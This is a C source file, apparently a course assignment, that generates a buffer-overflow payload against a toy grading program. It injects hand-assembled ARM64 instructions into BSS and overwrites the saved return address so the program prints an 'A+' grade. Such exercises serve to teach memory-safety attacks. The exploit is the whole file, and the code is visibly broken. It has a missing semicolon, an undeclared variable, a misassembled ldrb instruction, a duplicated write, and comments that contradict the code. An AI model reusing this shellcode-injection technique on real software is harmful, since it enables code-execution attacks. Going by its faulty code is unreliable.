/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                           */
/* Author: Marti Vives and Minh-Thi Nguyen                            */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "miniassembler.h"

/* reads from the commandline the name(s) of the
student (assumes it does not exceed 48 bytes). 
Writes to a file named dataB */

int main(int argc, char* argv[])
{
	int i;
	unsigned long j;
	char* p;
	char* pA = "%c"
	unsigned long BSS_start_adr = 0x420058;
	unsigned long adrp_adr_BSS;
	unsigned long cont_name2buf;
	unsigned long cont_name = 0;
	unsigned int mov;
	unsigned int adr;
	unsigned int strb;
	unsigned int b;
	unsigned int adrp1;
	unsigned int add;
	unsigned int adrp2;
	unsigned int ldrb;
	unsigned int bl;


	FILE *psFile; /* dataB file */

	psFile = fopen("dataA", "w");

	/* recall argv[0] is the program name so start at 1 */
	for (i = 1; i < argc; i++)
	{

		/* put each string argv */
		for (p = argv[i]; *p != '\0'; p++)
		{
			putc(*p,psFile);
		}

		cont_name+=strlen(argv[i]);
		/* add a space between argv's */
		if (i != (argc-1)) {
			putc(' ',psFile);
			cont_name++;
		}
	}
	/* need a terminating null char */
	putc('\0',psFile);
	cont_name++;

	/* need to add nullbytes to make cont_name
	a multiple of 4 due to the assembly 4byte addresses */
	while(cont_name % 4 != 0){
		putc('\0',psFile);
		cont_name++;
	}

	adrp_adr_BSS = BSS_start_adr+cont_name;

	/* the general idea is to first print an 'A' character
and then repeat the same proceudre as before in the A attack but substi-
tuting the 'A' for a '+' so that when branching to the print in main we
already have an A and then + is your grade etc. We implemented the required
functions in miniassembler.c to do that and got some bugs when implementing
it on createdataAplus.c */

	/* print A */
	/* adrp	x0, 0x400000 */
	adrp = MiniAssembler_adrp(0x00,0x400000,adrp_adr_BSS);

	/* add	x0, x0, #0x960 */
	add = MiniAssembler_add(0x00,0x00,0x960);


	/* adrp	x1, 0x420000 */
	adrp = MiniAssembler_adrp(0x01,0x420000,adrp_adr_BSS+4*2);

	/* ldrb	w1, [x1,#68] */
	add = MiniAssembler_add(0x01,0x01,0x44);
	ldrb = MiniAssembler_adrp(0x01,adrp_adr_BSS+4*3);

	/* bl	0x400600 <printf@plt> */
	bl = MiniAssembler_bl(0x400600,adrp_adr_BSS+4*4);

	/* now write that */
 	fwrite(&adrp, sizeof(unsigned int), 1, psFile);
 	fwrite(&add, sizeof(unsigned int), 1, psFile);
 	fwrite(&add, sizeof(unsigned int), 1, psFile);
 	fwrite(&ldrb, sizeof(unsigned int), 1, psFile);
  	fwrite(&bl, sizeof(unsigned int), 1, psFile);
	

	/* Add instructions to set grade = + so that
	when branching we will have that A+ */

	/* mov w0, '+' */
	mov = MiniAssembler_mov(0x00,0x2B);

	/* adr x1, grade */
	adr = MiniAssembler_adr(0x01,0x420044,adrp_adr_BSS+4);

	/* strb w0,[x1] */
	strb = MiniAssembler_strb(0x00,0x01);

	/* b to printf in main */
	b = MiniAssembler_b(0x400864,adrp_adr_BSS+4*3);

	/* now write that */
 	fwrite(&mov, sizeof(unsigned int), 1, psFile);
 	fwrite(&adr, sizeof(unsigned int), 1, psFile);
 	fwrite(&strb, sizeof(unsigned int), 1, psFile);
 	fwrite(&b, sizeof(unsigned int), 1, psFile);

	cont_name+=9*sizeof(unsigned int);
	/* Finish filling all the buf array */
	cont_name2buf = 48-cont_name;
	for (j = 0; j < cont_name2buf; j++)
 		putc('\0', psFile); 

 	/* Rewrite return addresss to main directed at setting B grade */
 	fwrite(&adrp_adr_BSS, sizeof(unsigned long), 1, psFile);

	return 0;
}


